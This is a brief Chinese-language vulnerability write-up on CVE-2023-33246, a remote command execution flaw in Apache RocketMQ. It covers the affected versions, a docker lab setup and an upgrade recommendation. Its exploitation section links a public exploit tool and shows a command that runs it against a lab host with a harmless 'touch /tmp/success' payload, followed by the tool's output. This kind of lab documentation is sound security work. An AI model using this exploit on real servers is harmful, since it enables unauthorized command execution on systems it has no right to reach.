# CVE-2023-33246

> **Create by：** A-little-dragon
>
> **Team：** TracelessSec
>
> **漏洞描述：** Apache RocketMQ 远程命令执行漏洞




## 0x01 漏洞描述

对于RocketMQ 5.1.0及以下版本，在某些情况下，存在远程命令执行的风险。RocketMQ的几个组件，包括NameServer、Broker和Controller，在网络上泄露，并且缺乏权限验证，攻击者可以通过使用更新配置功能作为RocketMQ运行的系统用户执行命令来利用此漏洞。此外，攻击者还可以通过伪造RocketMQ协议内容来达到同样的效果。为了防止这些攻击，建议使用RocketMQ 5.x的用户升级到5.1.1或更高版本，使用Rocket MQ 4.x的用户升级到4.9.6或更高版本。

## 0x02 影响范围

```javascript
5.x < 5.1.1
4.x < 4.9.6
```

## 0x03 环境搭建

```javascript
docker 启动环境搭建成功
docker-compose up -d
```

## 0x04 漏洞利用

工具下载地址：<https://github.com/Le1a/CVE-2023-33246>

```
java -jar CVE-2023-33246.jar -ip "192.168.10.123:10911" -cmd "touch /tmp/success" 
```



```javascript
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
RocketMQLog:WARN No appenders could be found for logger (io.netty.util.internal.InternalThreadLocalMap).
RocketMQLog:WARN Please initialize the logger system properly.
初始rocketmqHome为: /rocketmq-all-5.1.0-bin-release
攻击已结束!请稍后查看结果!
10:45:19.023 [NettyClientSelector_1] INFO  RocketmqRemoting - closeChannel: close the connection to remote address[1.1.1.1:9876] result: true
10:45:19.027 [NettyClientSelector_1] INFO  RocketmqRemoting - closeChannel: close the connection to remote address[1.1.1.1:9876] result: true
配置已经还原为: /rocketmq-all-5.1.0-bin-release!
10:45:19.032 [NettyClientSelector_1] INFO  RocketmqRemoting - closeChannel: close the connection to remote address[192.168.10.123:10911] result: true
```

 ![](image/00e2ec4c-a476-4d02-bb42-1a2fd2fd7f26.png)